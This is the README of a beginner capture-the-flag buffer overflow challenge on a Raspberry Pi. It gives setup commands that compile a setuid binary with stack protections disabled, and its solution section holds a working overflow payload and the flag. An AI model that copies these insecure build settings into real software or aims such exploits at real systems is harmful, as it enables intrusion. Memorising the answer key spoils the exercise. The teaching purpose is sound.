# BufferOverflow1
This challenges introduces a standard buffer overflow to the player.
**Description of the Challenge:**
How do I redirect code execution?

## Setup
The challenge is running on a Raspberry Pi 3. Therefore, the player needs to connect to the RPI via SSH and exploit the challenge. The player was granted with limited privileges. As a result, he/she is not able to read the content of the file *flag.txt*.

### Configuration on Raspberry Pi 3
**Compile without security features:**
```sudo gcc challenge1.c -z execstack -z norelro -fno-stack-protector -D_FORTIFY_SOURCE=0 -ggdb -o challenge1```

**Set *flag.txt* to read-only:**
```sudo chmod 440 flag.txt```

**Set privileges for the *challenge1* binary to 751 (rwxr-x--r):**
```sudo chmod 751 challenge1```

**Set uid flag to allow the binary to read the flag:**
```sudo chmod u+s challenge1```

## Solution
* Connect to the RPI via SSH:
```ssh challenge2@<IP>```

* The following payload was working on the CTF RPI. The number of requried `A`'s might differ from system to system. 
```./challenge1 $(python -c 'print "A"*16+"\xad\xde\xed\xfe"')```

## Flag
THICTF{y0ur_first_buff3r_overfl0w}
